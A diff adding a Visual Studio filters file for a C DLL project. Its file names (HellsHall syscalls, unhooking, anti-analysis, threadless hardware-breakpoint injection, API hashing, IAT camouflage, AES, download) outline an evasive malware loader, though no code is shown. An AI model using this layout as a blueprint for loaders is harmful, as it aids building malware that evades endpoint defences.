@@ -1,0 +1,102 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Common">
+      <UniqueIdentifier>{2492e270-6606-4800-af6c-b7493f092041}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="CtAes">
+      <UniqueIdentifier>{53b2c656-a7b2-4dcf-9449-c4fe8157af70}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Debug">
+      <UniqueIdentifier>{c86fc2fd-a078-4475-b567-09a6e4f35227}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="HellsHall">
+      <UniqueIdentifier>{666dd7d6-52c8-47be-b39a-3ee551668125}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Miscellaneous">
+      <UniqueIdentifier>{3367f48c-c23b-40b6-8af5-149751567bf2}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{a389ad13-1188-4b9f-917d-359698d36e90}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="dllmain.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Common.c">
+      <Filter>Common</Filter>
+    </ClCompile>
+    <ClCompile Include="CtAes.c">
+      <Filter>CtAes</Filter>
+    </ClCompile>
+    <ClCompile Include="Debug.c">
+      <Filter>Debug</Filter>
+    </ClCompile>
+    <ClCompile Include="HellsHall.c">
+      <Filter>HellsHall</Filter>
+    </ClCompile>
+    <ClCompile Include="ApiHashing.c">
+      <Filter>Miscellaneous</Filter>
+    </ClCompile>
+    <ClCompile Include="Unook.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="anti_analysis.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="threadless_HWBP.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Donwload.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Common.h">
+      <Filter>Common</Filter>
+    </ClInclude>
+    <ClInclude Include="CtAes.h">
+      <Filter>CtAes</Filter>
+    </ClInclude>
+    <ClInclude Include="Debug.h">
+      <Filter>Debug</Filter>
+    </ClInclude>
+    <ClInclude Include="Structs.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="FunctionPntrs.h">
+      <Filter>Miscellaneous</Filter>
+    </ClInclude>
+    <ClInclude Include="IatCamo.h">
+      <Filter>Miscellaneous</Filter>
+    </ClInclude>
+    <ClInclude Include="resource.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="resource1.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="HellsAsm.asm">
+      <Filter>HellsHall</Filter>
+    </MASM>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Source.def">
+      <Filter>Source Files</Filter>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="metadata.rc" />
+  </ItemGroup>
+</Project>
